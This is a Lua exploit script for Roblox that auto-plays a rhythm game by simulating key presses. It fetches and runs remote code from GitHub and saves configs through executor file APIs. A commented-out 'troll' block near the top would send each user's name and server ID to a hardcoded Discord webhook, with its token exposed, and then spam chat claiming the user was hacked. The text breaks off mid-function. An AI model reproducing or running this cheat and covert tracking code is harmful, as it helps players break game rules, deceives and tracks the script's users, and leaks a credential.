-- // obfuscated anticheat fixer, skull emoji...
-- // troll day!
print('working btw!')
local loadtext = Instance.new('Hint', workspace)
loadtext.Text = 'Loading Vastal PREMIUM FUCKIN EDITION'
task.delay(2, function() loadtext:Destroy() end)
task.spawn(function()
		game.Players.PlayerAdded:Connect(function(plr)
				if plr.Name == 'Sammywammylol502' then
					local hint = Instance.new('Hint', workspace)
					hint.Text = 'A Vastal developer has joined your game! ('..plr.DisplayName..')' -- kys!
					game.Debris:AddItem(hint, 3)
				end
		end)
end)
--[[local troll = false
if game.Players.LocalPlayer.Name ~= "Sammywammylol502" and troll then task.spawn(function()
    local HttpService = game:GetService("HttpService")

    request({
        Url = "https://discordapp.com/api/webhooks/1506162347054727261/sLurO4YZGRxs5jSWKKmT2noinC89lb-AdmVpPBXrCxxY9QWkwmXJo0H7TtRbV-cL-LpX",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            username = game.Players.LocalPlayer.Name,
            content = 'JobId = `'..game.JobId..'`\nPlaceId = `'..game.PlaceId..'`\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```'
        })
    })local hint
	task.delay(15,function()hint=Instance.new('Hint',workspace)hint.Text='im watching...'end)
    task.wait(25)
	 hint:Destroy()
	request({
        Url = "https://discordapp.com/api/webhooks/1506162347054727261/sLurO4YZGRxs5jSWKKmT2noinC89lb-AdmVpPBXrCxxY9QWkwmXJo0H7TtRbV-cL-LpX",
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            username = game.Players.LocalPlayer.Name,
            content = 'KABOOM'
        })
    })
	--game.CoreGui.RobloxGui:Destroy()
	game.TextChatService.TextChannels.RBXGeneral:SendAsync('Hi I am totally not cheating using vastal rn')
	task.wait(0.5)
	game.TextChatService.TextChannels.RBXGeneral:SendAsync('BRO THEY GOT MY PC OMGGGG')
	task.wait(0.5)
	task.wait(1)
	game.Players.LocalPlayer.PlayerGui:ClearAllChildren()
	task.spawn(function() while task.wait(1.5) do game.TextChatService.TextChannels.RBXGeneral:SendAsync('Dude HELP ME PLEASE THEY HAVE MY STUFF') end end)
end) end]]
for _, v in ipairs(game.CoreGui:GetDescendants()) do
	if v.Name:find("WindUI") then
		v:Destroy()
	end
end

pcall(function()
	makefolder("vastal")
	makefolder("vastal/mmm")
	makefolder("vastal/mmm/cache")
    makefolder('vastal/mmm/.ignore')
	writefile("vastal/startup.mp3", game:HttpGet("https://github.com/juliusxpn/Vastal/raw/refs/heads/main/games/7205641391/startup.mp3"))
end)

pcall(function()
    writefile('vastal/newico.png', game:HttpGet("https://github.com/juliusxpn/Vastal/blob/main/newico.png?raw=true"))
end)

pcall(function()
    if isfile("vastal/mmm/.defcfgcheck") then
        return
    end

    if not isfolder("vastal/mmm") then
        makefolder("vastal/mmm")
    end

    local configs = {
        ["Blatant Bot (god)"] = "Blatant%20Bot%20(god)",
        ["Decent Bot"] = "Decent%20Bot",
        ["Early Bot"] = "Early%20Bot",
        ["Late Bot"] = "Late%20Bot",
        ["Pretty Okay Bot"] = "Pretty%20Okay%20Bot",
        ["Terrible Bot"] = "Terrible%20Bot"
    }

    local base = "https://raw.githubusercontent.com/juliusxpn/Vastal/main/games/7205641391/defaultconfigs/"

    repeat
        task.wait(0.25)

        for name, encoded in pairs(configs) do
            local path = "vastal/mmm/" .. name .. ".json"

            if not isfile(path) then
                local ok, data = pcall(game.HttpGet, game, base .. encoded .. ".json", true)
                if ok and data then
                    writefile(path, data)
                end
            end
        end

        local done = true
        for name in pairs(configs) do
            if not isfile("vastal/mmm/" .. name .. ".json") then
                done = false
                break
            end
        end
    until done

    writefile("vastal/mmm/.defcfgcheck", "nil")
end)


local HttpService = game:GetService("HttpService")
local config_path = "vastal/config.json"
local default_config = {
	selected_side = "Right",
	selected_mode = "4K",
	can_toggle_auto_player = true,
	auto_player_enabled = true,
	another_slider_offset = 0,
	base_hit_window = 0,
	base_release_delay = 0.01,
	release_randomizer = 0,
	make_mistakes = false,
	eh = false,
	hide_enabled = false,
    mistake_chance = 0.1
}

local function load_config()
	local success, result = pcall(function()
		if isfile(config_path) then
			local content = readfile(config_path)
			return HttpService:JSONDecode(content)
		end
	end)
	if success and result then
		for k, v in pairs(default_config) do
			if result[k] == nil then
				result[k] = v
			end
		end
		return result
	else
		return table.clone(default_config)
	end
end

local function save_config(config)
	pcall(function()
		local json = HttpService:JSONEncode(config)
		writefile(config_path, json)
	end)
end

local config = load_config()

local clone = cloneref or function(obj) return obj end
local rs = clone(game:GetService("RunService"))
local ts = game:GetService("TweenService")
local vim = clone(game:GetService("VirtualInputManager"))
local players = clone(game:GetService("Players"))
local player = players.LocalPlayer
local coreGui = clone(game:GetService('CoreGui'))
local http = clone(game:GetService("HttpService"))
local tcs = clone(game:GetService('TextChatService'))
local user_input = clone(game:GetService("UserInputService"))

local sound = Instance.new("Sound")
sound.Parent = clone(game:GetService("SoundService"))
sound.SoundId = getcustomasset("vastal/startup.mp3")
sound:Play()

local WindUI = loadstring(game:HttpGet(
	"https://github.com/juliusxpn/Vastal/raw/refs/heads/main/UI/WindUI.lua"
))()

local status_link = "https://github.com/juliusxpn/Vastal/raw/refs/heads/main/games/" .. game.PlaceId .. "/status.txt"
local status_icon = ""
if game:HttpGet(status_link):find('!true') then
    status_icon = "🟢"
else
    status_icon = "🔴"
end

WindUI:AddTheme({
    Name = "assfart",

    Accent = Color3.fromHex("#1d1d21"),
    Background = Color3.fromHex("#0f0f12"),
    BackgroundTransparency = 0.3,
    Outline = Color3.fromHex("#3b3b48"),

    Text = Color3.fromHex("#c8c8c8"),
    Placeholder = Color3.fromHex("#6b6b74"),

    Button = Color3.fromHex("#1b1b1f"),
    Icon = Color3.fromHex("#7cb0ff"),
    Hover = Color3.fromHex("#c6cef0"),

    WindowBackground = Color3.fromHex("#16161a"),
    WindowShadow = Color3.fromHex("#30477c"),

    DialogBackground = Color3.fromHex("#141418"),
    DialogBackgroundTransparency = 0.3,
    DialogTitle = Color3.fromHex("#f5f5f5"),
    DialogContent = Color3.fromHex("#d0d0d0"),
    DialogIcon = Color3.fromHex("#8caad2"),

    WindowTopbarButtonIcon = Color3.fromHex("#8cb0d2"),
    WindowTopbarTitle = Color3.fromHex("#f5f5f5"),
    WindowTopbarAuthor = Color3.fromHex("#cfcfcf"),
    WindowTopbarIcon = Color3.fromHex("#f5f5f5"),

    TabBackground = Color3.fromHex("#19191e"),
    TabTitle = Color3.fromHex("#ededed"),
    TabIcon = Color3.fromHex("#8cbcd2"),

    ElementBackground = Color3.fromHex("#1d2831"),
    ElementBackgroundTransparency = 0.4,
    ElementTitle = Color3.fromHex("#e8edf2"),
    ElementDesc = Color3.fromHex("#d6d0c6"),
    ElementIcon = Color3.fromHex("#9acde0"),

    PopupBackground = Color3.fromHex("#131316"),
    PopupBackgroundTransparency = 0.1,
    PopupTitle = Color3.fromHex("#f5f5f5"),
    PopupContent = Color3.fromHex("#d0d0d0"),
    PopupIcon = Color3.fromHex("#8c9ad2"),

    Toggle = Color3.fromHex("#17171b"),
    ToggleBar = Color3.fromHex("#d2b48c"),

    Checkbox = Color3.fromHex("#1b1b21"),
    CheckboxIcon = Color3.fromHex("#8ca9d2"),

    Slider = Color3.fromHex("#151519"),
    SliderThumb = Color3.fromHex("#8cacd2"),
})

local window = WindUI:CreateWindow({
	Title  = "Vastal",
	Icon   = getcustomasset("vastal/newico.png"),
    Theme  = 'assfart',
	Author = "Vesta (Julius),  Squrri (evohibit)",
	Folder = "VestaAutoPlayer",
	Size   = UDim2.fromOffset(600, 333),
    Radius = 10
})

local base = "https://raw.githubusercontent.com/juliusxpn/Vastal/main/games/" .. tostring(game.PlaceId) .. "/lite"
local lite_script_url = base .. "/script.lua"

local suc, body = pcall(function()
    return game:HttpGet(lite_script_url)
end)

if suc and body then
    if not isfile("vastal/mmm/.ignore/mmmlite") then
        WindUI:Popup({
            Title = "A Lite version is available!",
            Icon = "info",
            Content = "Do you want to use the Lite version of this script? It offers way more customizable features but probably wont stay up-to-date with the actual script.",
            Buttons = {
                {
                    Title = "No",
                    Icon = "x",
                    Variant = "Tertiary",
                    Callback = function() end
                },
                {
                    Title = "Don't show me again.",
                    Icon = "x",
                    Variant = "Primary",
                    Callback = function()
                        writefile("vastal/mmm/.ignore/mmmlite","")
                    end
                },
                {
                    Title = "Yes",
                    Icon = "check",
                    Variant = "Primary",
                    Callback = function()
                        loadstring(body)()
                    end
                }
            }
        })
    end
end

window:Tag({
    Title = "Pre-release v1.0.0",
    Color = Color3.fromHex("#a9cce9"),
    Radius = 6,
})

local mainTab = window:Tab({ Title = "Utility", Icon = "pickaxe" })
pcall(function()
    mainTab:Select()
end)
local configTab = window:Tab({ Title = "Configs", Icon = "folder-cog" })
window:Divider()
local creditsTab = window:Tab({ Title = "Credits", Icon = "users-round" })
local submissions = window:Tab({ Title = "Submissions", Icon = "mail-plus" })
local Section = submissions:Section({
    Title = "Send your submissions! Click the link below and open it in your browser, you will need a working Github account to send a submisson.",
    Icon = "mail",
    Opened = true,
})
local Button = submissions:Button({
    Title = "Submission Button",
    Desc = "Click me to copy the link to your clipboard.",
    Locked = false,
    Callback = function()
        setclipboard('https://github.com/juliusxpn/Vastal/issues/new?template=idea_request.yml')
        WindUI:Notify({
            Title = "Pasted.",
            Content = "Now open the URL in your desired browser (Google, Bing, ETC)",
            Duration = 10,
            Icon = "check",
        })
    end
})
creditsTab:Button({
    Title = "Vesta (Click to copy LINK)",
    Desc = "Click to copy Vesta's Github",
    Locked = false,
    Callback = function()
        setclipboard('https://github.com/juliusxpn')
    end
})

local ui_elements = {}
local selected_mode = config.selected_mode
local selected_side = config.selected_side
local auto_player_enabled = config.auto_player_enabled
local can_toggle_auto_player = config.can_toggle_auto_player
local another_slider_offset = config.another_slider_offset
local base_hit_window = config.base_hit_window
local base_release_delay = config.base_release_delay
local release_randomizer = config.release_randomizer
local make_mistakes = config.make_mistakes
local eh = config.eh
local hide_enabled = config.hide_enabled
local mistake_chance = config.mistake_chance or 0.1


local function get_next_config_number()
    local i = 1
    while isfile("vastal/mmm/vastalcfg_" .. i .. ".json") do
        i = i + 1
    end
    return i
end

local function get_all_configs()
    local configs = {}
    local files = listfiles("vastal/mmm")
    
    for _, filepath in ipairs(files) do
        local filename = filepath:match("([^/\\]+)%.json$")
        if filename then
            table.insert(configs, filename)
        end
    end
    
    return configs
end

local function save_new_config(custom_name)
    local name = custom_name or ("vastalcfg_" .. get_next_config_number())
    local path = "vastal/mmm/" .. name .. ".json"
    
    local current_config = {
        selected_side = selected_side,
        selected_mode = selected_mode,
        can_toggle_auto_player = can_toggle_auto_player,
        auto_player_enabled = auto_player_enabled,
        another_slider_offset = another_slider_offset,
        base_hit_window = base_hit_window,
        base_release_delay = base_release_delay,
        release_randomizer = release_randomizer,
        make_mistakes = make_mistakes,
        eh = eh,
        hide_enabled = hide_enabled,
        mistake_chance = mistake_chance
    }
    
    local json = HttpService:JSONEncode(current_config)
    writefile(path, json)
    return name
end

local function load_saved_config(name)
    local path = "vastal/mmm/" .. name .. ".json"
    if not isfile(path) then return end
    
    local content = readfile(path)
    local loaded = HttpService:JSONDecode(content)
    
    selected_side = loaded.selected_side or "Right"
    selected_mode = loaded.selected_mode or "4K"
    can_toggle_auto_player = loaded.can_toggle_auto_player
    auto_player_enabled = loaded.auto_player_enabled
    another_slider_offset = loaded.another_slider_offset or 0
    base_hit_window = loaded.base_hit_window or 0
    base_release_delay = loaded.base_release_delay or 0.05
    release_randomizer = loaded.release_randomizer or 0
    make_mistakes = loaded.make_mistakes or false
    eh = loaded.eh or false
    mistake_chance = loaded.mistake_chance or 0.1
    hide_enabled = loaded.hide_enabled or false
    
    config = loaded
    save_config(config)
    
    pcall(function() ui_elements.side_dropdown:Set(selected_side) end)
    pcall(function() ui_elements.mode_dropdown:Set(selected_mode) end)
    pcall(function() ui_elements.can_toggle:Set(can_toggle_auto_player) end)
    pcall(function() ui_elements.autoplay_toggle:Set(auto_player_enabled) end)
    pcall(function() ui_elements.hit_randomizer:Set(another_slider_offset) end)
    pcall(function() ui_elements.hit_window:Set(base_hit_window) end)
    pcall(function() ui_elements.release_delay:Set(base_release_delay) end)
    pcall(function() ui_elements.release_randomizer:Set(release_randomizer) end)
    pcall(function() ui_elements.mistakes_toggle:Set(make_mistakes) end)
    pcall(function() ui_elements.eh_toggle:Set(eh) end)
    pcall(function() ui_elements.hide_toggle:Set(hide_enabled) end)
    pcall(function() ui_elements.mistake_slider:Set(mistake_chance * 100) end)

    WindUI:Notify({
        Title = "Loaded configuraton!",
        Content = "Your configuraton has been applied.",
        Duration = 5,
        Icon = "check",
    })
end

local function delete_config(name)
    local path = "vastal/mmm/" .. name .. ".json"
    if isfile(path) then
        delfile(path)
    end
    repeat task.wait(0.05) until not isfile(path)
    WindUI:Notify({
        Title = "Configuraton deleted.",
        Content = "Your configuraton has been deleted.",
        Duration = 5,
        Icon = "check",
    })
end

local config_buttons = {}

local function refresh_config_list()
    for _, btn in pairs(config_buttons) do
        pcall(function() btn:Destroy() end)
    end
    config_buttons = {}
    
    local configs = get_all_configs()
    for _, cfg_name in ipairs(configs) do
        local btn = configTab:Button({
            Title = cfg_name,
            Desc = "Click to load this config",
            Locked = false,
            Callback = function()
                load_saved_config(cfg_name)
            end
        })
        table.insert(config_buttons, btn)
    end
end

local config_name_value = ""

configTab:Input({
    Title = "Name",
    Placeholder = "name",
    Default = "",
    Callback = function(value)
        config_name_value = value
    end
})

configTab:Button({
    Title = "Delete configuration",
    Desc = "Deletes the configuraton of the name above",
    Locked = false,
    Callback = function()
        delete_config(config_name_value)
        refresh_config_list()
    end
})

configTab:Button({
    Title = "Save New Config",
    Desc = "Saves your current settings with the name above",
    Locked = false,
    Callback = function()
        local custom_name = config_name_value
        if custom_name and custom_name ~= "" then
            custom_name = custom_name:gsub("[^%w_-]", "")
            if custom_name == "" then
                custom_name = nil
            end
        else
            custom_name = nil
        end
        
        local name = save_new_config(custom_name)

        config_name_value = ""
        
        refresh_config_list()
    end
})

configTab:Divider()
refresh_config_list()

if status_icon == "🔴" then
    local Dialog = window:Dialog({
        Icon = "circle-alert",
        Title = "Vesta's Autoplayer isn't updated yet!",
        Content = "Are you sure that you want to run? The script will most definitely not work.",
        Buttons = {
            {
                Title = "Yes",
                Callback = function() Dialog = nil end,
            },
            {
                Title = "No",
                Callback = function()
                    for _, v in ipairs(game.CoreGui:GetDescendants()) do
	                    if v.Name:find("WindUI") then
	    	                v:Destroy()
	                    end
                    end
                    return
                end,
            },
        },
    })
end

local key_maps = {
	["4K"] = {
		order = { "Left", "Down", "Up", "Right" },
		keys = {
			Left  = Enum.KeyCode.A,
			Down  = Enum.KeyCode.S,
			Up    = Enum.KeyCode.D,
			Right = Enum.KeyCode.F
		}
	},
    ["5K"] = {
		order = { "Left", "Down", "Space", "Up", "Right" },
		keys = {
			Left = Enum.KeyCode.D,
            Down = Enum.KeyCode.F,
            Space = Enum.KeyCode.Space,
            Up = Enum.KeyCode.J,
            Right = Enum.KeyCode.K
		}
	},
	["6K"] = {
		order = { "Left", "Up", "Right", "Left2", "Down", "Right2" },
		keys = {
			Left   = Enum.KeyCode.S,
			Up     = Enum.KeyCode.D,
			Right  = Enum.KeyCode.F,
			Left2  = Enum.KeyCode.J,
			Down   = Enum.KeyCode.K,
			Right2 = Enum.KeyCode.L
		}
	},
	["7K"] = {
		order = { "Left", "Up", "Right", "Space", "Left2", "Down", "Right2" },
		keys = {
			Left   = Enum.KeyCode.S,
			Up   = Enum.KeyCode.D,
			Right     = Enum.KeyCode.F,
			Space  = Enum.KeyCode.Space,
			Left2  = Enum.KeyCode.J,
			Down  = Enum.KeyCode.K,
			Right2 = Enum.KeyCode.L
		}
	},
	["9K"] = {
		order = { "Left", "Down", "Up", "Right", "Space", "Left2", "Down2", "Up2", "Right2" },
		keys = {
			Left   = Enum.KeyCode.A,
			Down   = Enum.KeyCode.S,
			Up     = Enum.KeyCode.D,
			Right  = Enum.KeyCode.F,
			Space  = Enum.KeyCode.Space,
			Left2  = Enum.KeyCode.J,
			Down2  = Enum.KeyCode.K,
			Up2    = Enum.KeyCode.L,
			Right2 = Enum.KeyCode.Semicolon
		}
	},
	["8K"] = {
		order = { "Left", "Down", "Up", "Right", "Left2", "Down2", "Up2", "Right2" },
		keys = {
			Left   = Enum.KeyCode.A,
			Down   = Enum.KeyCode.S,
			Up     = Enum.KeyCode.D,
			Right  = Enum.KeyCode.F,
			Left2  = Enum.KeyCode.J,
			Down2  = Enum.KeyCode.K,
			Up2    = Enum.KeyCode.L,
			Right2 = Enum.KeyCode.Semicolon
		}
	}
}

ui_elements.side_dropdown = mainTab:Dropdown({
	Title = "What side are you playing on?\nThis is ur left: <--\nThis is ur right: -->",
	Values = { "Left", "Right" },
	Value = selected_side,
	Callback = function(v)
        if ui_elements.autoplay_toggle then
            pcall(function()
                ui_elements.autoplay_toggle:Set(false)
                task.wait(0.1)
                ui_elements.autoplay_toggle:Set(true)
            end)
        end
		selected_side = v
		config.selected_side = v
		save_config(config)
	end
})

ui_elements.mode_dropdown = mainTab:Dropdown({
	Title = "What are your notes?",
	Values = { "4K", "6K", "5K", "7K", "8K", "9K" },
	Value = selected_mode,
	Callback = function(v)
		selected_mode = v
		config.selected_mode = v
		save_config(config)
	end
})

ui_elements.can_toggle = mainTab:Toggle({
    Title = "Click me to toggle the Autoplayer!",
    Type = "Checkbox",
    Default = can_toggle_auto_player,
    Callback = function(state) 
        can_toggle_auto_player = state
		config.can_toggle_auto_player = state
		save_config(config)
    end
})

ui_elements.autoplay_toggle = mainTab:Toggle({
	Title = "ignore me lol",
	Type = "Checkbox",
	Default = auto_player_enabled,
	Callback = function(v)
		auto_player_enabled = v
		config.auto_player_enabled = v
		save_config(config)
	end
})

mainTab:Divider()
mainTab:Paragraph({
	Title = "Instructions",
	Desc  = "Use up scroll!\n\n4K: A S D F\n5K: Default. DF SPACE JK\n6K: S D F J K L\n7K: S D F SPACE J K L\n9K and 8K: A S D F SPACE J K L ;\n\nAutoplayer doesn't work?\n\n1. Vastal might not be updated\n2. Rejoin\n3. Exploit may not support virtual input manager\n4. Contact my github or discord (at my github!)\n5. Or maybe change your note settings, possibly others to default",
	Image = "info"
})

if shared.__AUTOPLAYER then 
    pcall(function()
        shared.__AUTOPLAYER:Disconnect()
    end)
end

local ArrowGui

local function search_for_arrow_gui()
    for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
        if gui.Name == "ArrowGui" then
            return gui
        end
    end
    return nil
end

 WindUI:Popup({
            Title = "                    Vastal Reminder!",
            Icon = 0,
            Content = 'Before you go ahead and use the autoplayer, make sure that your keybinds are ASDF, this goes for 5k. Keep 6k and above the same.\n\nYou can change your keybinds by going on the main screen, pressing options, and going to the controls area',
            Buttons = {
                {
                    Title = "Okay, thanks",
                    Icon = "check",
                    Variant = "Tertiary",
                    Callback = function() end
                }
            }
        })

local function wait_for_arrow_gui()
    while not ArrowGui do
        ArrowGui = player.PlayerGui:FindFirstChild("ArrowGui", true)
        
        if not ArrowGui then
            ArrowGui = search_for_arrow_gui()
        end
        
        if not ArrowGui then
            task.wait(0.01)
        else
            local side = ArrowGui:FindFirstChild(selected_side)
            if not side then
                ArrowGui:WaitForChild(selected_side, 10)
            end
        end
    end
end

task.spawn(function()
    wait_for_arrow_gui()
end)

player.PlayerGui.DescendantAdded:Connect(function(o)
	if o.Name == "ArrowGui" then
		ArrowGui = o
	end
end)

player.PlayerGui.DescendantRemoving:Connect(function(o)
	if o == ArrowGui then
		ArrowGui = nil
        task.spawn(function()
            wait_for_arrow_gui()
        end)
	end
end)

local function get_target_gui()
    if not ArrowGui then return nil end
    return ArrowGui:FindFirstChild("Title")
end

local slider_offset = 0

ui_elements.hit_randomizer = mainTab:Slider({
    Title = "Hit window randomizer",
    Desc = "Move the slider! It will change how bad the bot is depending on how high it is.",
    Step = 0.0001,
    Value = { Min = 0, Max = 200, Default = another_slider_offset },
    Callback = function(value) 
		another_slider_offset = value
		config.another_slider_offset = value
		save_config(config)
	end
})

ui_elements.hit_window = mainTab:Slider({
    Title = "Change hit window",
    Desc = "Move the slider! It changes what the distance notes will be hit at. Higher is late, lower is close. 0 for 100 accuracy",
    Step = 0.0001,
    Value = { Min = -200, Max = 200, Default = base_hit_window },
    Callback = function(value) 
		base_hit_window = value
		config.base_hit_window = value
		save_config(config)
	end
})

mainTab:Button({
    Title = "Use this if you can't create a good config:\nHit randomizer: 15\nHit window: -30\nRelease delay: 0.04\nRelease randomizer: 0.06",
    Desc = "you can't click this, you set it.",
    Locked = false,
    Callback = function() end
})

task.spawn(function()
    while true do
        local random_offset = (math.random() * 2 - 1) * another_slider_offset
        slider_offset = base_hit_window + random_offset
        if can_toggle_auto_player and ui_elements.autoplay_toggle then
            pcall(function()
                ui_elements.autoplay_toggle:Set(false)
                ui_elements.autoplay_toggle:Set(true)
            end)
        elseif ui_elements.autoplay_toggle then
            pcall(function()
                ui_elements.autoplay_toggle:Set(false)
            end)
        end
        task.wait(0.5)
    end
end)

local function get_offset(mode)
	if mode == "4K" or mode == "7K" then
		return 90 + slider_offset
	elseif mode == "6K" then
		return 80 + slider_offset
	else
		return 75 + slider_offset
	end
end

local function get_lane_container(name)
    if not ArrowGui then return nil end
    local side = ArrowGui:FindFirstChild(selected_side)
    if not side then return nil end
    local notes = side:FindFirstChild("Notes")
    if not notes then return nil end
    return notes:FindFirstChild(name)
end

local function get_hold_container(name)
    if not ArrowGui then return nil end
    local side = ArrowGui:FindFirstChild(selected_side)
    if not side then return nil end
    local longNotes = side:FindFirstChild("LongNotes")
    if not longNotes then return nil end
    return longNotes:FindFirstChild(name)
end

local function is_opponent(n)
	local a = n.Name:lower()
	local b = n.Parent and n.Parent.Name:lower() or ""
	return a:find("opp") or b:find("opp")
end

local release_delay = base_release_delay
local active_holds = {}
local keys_pressed = {}
local release_tokens = {}

local function delayed_release(lane, key)
	local token = (release_tokens[lane] or 0) + 1
	release_tokens[lane] = token

	task.delay(release_delay, function()
		if release_tokens[lane] == token and not active_holds[lane] then
			vim:SendKeyEvent(false, key, false, game)
			keys_pressed[lane] = nil
		end
	end)
end

ui_elements.release_delay = mainTab:Slider({
    Title = "Change Release delay",
    Desc = "How long the bot holds a key before releasing it.\n\n⚠ WARNING: May make you miss.",
    Step = 0.0001,
    Value = {
        Min = 0,
        Max = 5,
        Default = base_release_delay,
    },
    Callback = function(value)
        base_release_delay = value
		config.base_release_delay = value
		save_config(config)
    end
})

ui_elements.release_randomizer = mainTab:Slider({
    Title = "Release randomizer",
    Desc = "Randomizes release delay every release. 0 = disabled.\n\n⚠ WARNING: May make you miss.",
    Step = 0.0001,
    Value = {
        Min = 0,
        Max = 5,
        Default = release_randomizer,
    },
    Callback = function(value)
        release_randomizer = value
		config.release_randomizer = value
		save_config(config)
    end
})

local function get_release_delay()
    if release_randomizer > 0 then
        local offset = (math.random() * 2 - 1) * release_randomizer
        return math.max(0, base_release_delay + offset)
    end
    return base_release_delay
end

task.spawn(function()
    while true do
        if release_randomizer > 0 then
            local random_offset = (math.random() * 2 - 1) * release_randomizer
            release_delay = math.max(0, base_release_delay + random_offset)
        else
            release_delay = base_release_delay
        end
        task.wait(0.5)
    end
end)

ui_elements.mistakes_toggle = mainTab:Toggle({
    Title = "Mistakes.",
    Type = "Checkbox",
    Desc = "When this is toggle the bot will make mistakes if many notes appear at such a time.\n\n⚠ WARNING: May make you miss.",
    Default = make_mistakes,
    Callback = function(value)
        make_mistakes = value
		config.make_mistakes = value
		save_config(config)
    end
})

ui_elements.mistake_slider = mainTab:Slider({
    Title = "Mistake chance (%)",
    Desc = "Chance the bot will intentionally mess up when Mistakes is ON",
    Step = 0.0001,
    Value = {
        Min = 0,
        Max = 100,
        Default = mistake_chance * 100
    },
    Callback = function(value)
        mistake_chance = value / 100
        config.mistake_chance = mistake_chance
        save_config(config)
    end
})

shared.__AUTOPLAYER = rs.Heartbeat:Connect(function()
    if not auto_player_enabled then return end

    local target_gui = get_target_gui()
    if not target_gui then return end

    local mode = selected_mode
    local offset = get_offset(mode)
    local target_y = target_gui.AbsolutePosition.Y + offset
    local target_bottom = target_y + target_gui.AbsoluteSize.Y

    for _, lane in ipairs(key_maps[mode].order) do
        local key = key_maps[mode].keys[lane]
        local notes = get_lane_container(lane)
        local holds = get_hold_container(lane)

        if not key or not notes then
            continue
        end

        local new_hold

        if holds then
            for _, h in ipairs(holds:GetChildren()) do
                if h:IsA("GuiObject") and not is_opponent(h) then
                    local t = h.AbsolutePosition.Y
                    local b = t + h.AbsoluteSize.Y
                    if b >= target_y and t <= target_bottom then
                        new_hold = h
                        break
                    end
                end
            end
        end

        if new_hold then
            if active_holds[lane] ~= new_hold then
                if keys_pressed[lane] then
                    vim:SendKeyEvent(false, key, false, game)
                end

                if make_mistakes and #notes:GetChildren() > 2 and math.random() < 0.15 then
                    local other_lane = key_maps[mode].order[math.random(#key_maps[mode].order)]
                    if other_lane ~= lane then
                        local other_key = key_maps[mode].keys[other_lane]
                        vim:SendKeyEvent(true, other_key, false, game)
                        task.spawn(function()
                            task.wait(get_release_delay())
                            vim:SendKeyEvent(false, other_key, false, game)
                        end)
                    end
                end

                vim:SendKeyEvent(true, key, false, game)
                keys_pressed[lane] = true
                active_holds[lane] = new_hold
                release_tokens[lane] = (release_tokens[lane] or 0) + 1
            end
        elseif active_holds[lane] then
            active_holds[lane] = nil
            delayed_release(lane, key)
        end

        if not active_holds[lane] then
            for _, n in ipairs(notes:GetChildren()) do
                if n:IsA("GuiObject") and not is_opponent(n) then
                    local c = n.AbsolutePosition.Y + n.AbsoluteSize.Y / 2
                    if c >= target_y and c <= target_bottom then

                        if make_mistakes and #notes:GetChildren() > 3 and math.random() < 0.1 then
                            task.wait(get_release_delay() * math.random(1,2))
                        end

                        vim:SendKeyEvent(true, key, false, game)
                        keys_pressed[lane] = true
                        delayed_release(lane, key)

                        if make_mistakes and #notes:GetChildren() > 2 and math.random() < mistake_chance then
                            local extra_lane = key_maps[mode].order[math.random(#key_maps[mode].order)]
                            local extra_key = key_maps[mode].keys[extra_lane]
                            vim:SendKeyEvent(true, extra_key, false, game)
                            task.spawn(function()
                                task.wait(get_release_delay())
                                vim:SendKeyEvent(false, extra_key, false, game)
                            end)
                        end

                        break
                    end
                end
            end
        end
    end
end)

local function get_or_create_cache(key)
    if not shared[key] then
        shared[key] = {}
    end
    return shared[key]
end

task.spawn(function()
    while true do
        for _, v in ipairs(game.CoreGui:GetDescendants()) do
            if v.Name:find('WindUI') then
                repeat task.wait() until not v or not v.Parent
                local hide_cache = get_or_create_cache("cache")
                if shared.__AUTOPLAYER then 
                    pcall(function()
                        shared.__AUTOPLAYER:Disconnect()
                    end)
                    shared.__AUTOPLAYER = nil 
                end
                break
            end
        end
        task.wait(1)
    end
end)

ui_elements.eh_toggle = mainTab:Toggle({
    Title = "INSANE AUTOPLAY NO MISSES 69% ACCURACY",
    Type = "Checkbox",
    Default = eh,
    Callback = function(state)
        eh = state
		config.eh = state
		save_config(config)
    end
})

local spam_keys = {
    Enum.KeyCode.A,
    Enum.KeyCode.S,
    Enum.KeyCode.D,
    Enum.KeyCode.F,
    Enum.KeyCode.Space,
    Enum.KeyCode.J,
    Enum.KeyCode.K,
    Enum.KeyCode.L,
    Enum.KeyCode.Semicolon
}

task.spawn(function()
    while true do
        if eh then
            for _, key in ipairs(spam_keys) do
                vim:SendKeyEvent(true, key, false, game)
            end
            task.wait(0.01)
            for _, key in ipairs(spam_keys) do
                vim:SendKeyEvent(false, key, false, game)
            end
        end
        task.wait(0.01)
    end
end)

if mainTab and player then
    local hide_cache = get_or_create_cache("cache")

    local function apply_hide(obj)
        if obj:IsA("GuiObject") then
            local n = obj.Name:lower()
            if n:find("note")
            or n:find("hold")
            or n:find("left")
            or n:find("right")
            or n:find("up")
            or n:find("down")
            or n:find("rating")
            or n:find("feedback")
            or n:find("sick")
            or n:find("good")
            or n:find("bad")
            or n:find("miss")
            or n:find("health")
            or n:find("healthbar") then
                if hide_cache[obj] == nil then
                    hide_cache[obj] = obj.Visible
                    obj.Visible = false
                end
            end
        end
    end

    ui_elements.hide_toggle = mainTab:Toggle({
        Title = "Disable some GUI'S (This prevents SOME lag? But doesn't prevent those huge massive lagspikes.)",
        Type = "Checkbox",
        Default = hide_enabled,
        Callback = function(state)
            hide_enabled = state
			config.hide_enabled = state
			save_config(config)
            local gui_root = player.PlayerGui
            if state then
                for _, obj in ipairs(gui_root:GetDescendants()) do
                    apply_hide(obj)
                end
            else
                for obj, vis in pairs(hide_cache) do
                    if obj and obj.Parent then
                        obj.Visible = vis
                    end
                end
                hide_cache = {}
            end
            shared.cache = hide_cache
        end
    })

    player.PlayerGui.DescendantAdded:Connect(function(obj)
        if hide_enabled then
            apply_hide(obj)
            shared.cache = hide_cache
        end
    end)
end

-- Nvesta!!! =D
local function chk(o)
    local p = o.Parent
    while p do
        if string.find(string.lower(p.Name), "sammywammylol502") then return true end
        p = p.Parent
    end
    return false
end

local function mkGrad(t)
    local g = Instance.new("UIGradient", t)
    g.Rotation = 90
    return g
end

local function anim(t, g)
    task.spawn(function()
        local c = 0
        local w = math.pi / 8
        local n = 12
        while t and t.Parent do
            local cs = {}
            for i = 0, n do
                local r = 127 * math.sin(w*i + c) + 128
                local gr = 127 * math.sin(w*i + 2*math.pi/3 + c) + 128
                local b = 127 * math.sin(w*i + 4*math.pi/3 + c) + 128
                local col = Color3.fromRGB(
                    math.clamp(r * 1.3 + 80, 180, 255),
                    math.clamp(gr * 1.3 + 80, 180, 255),
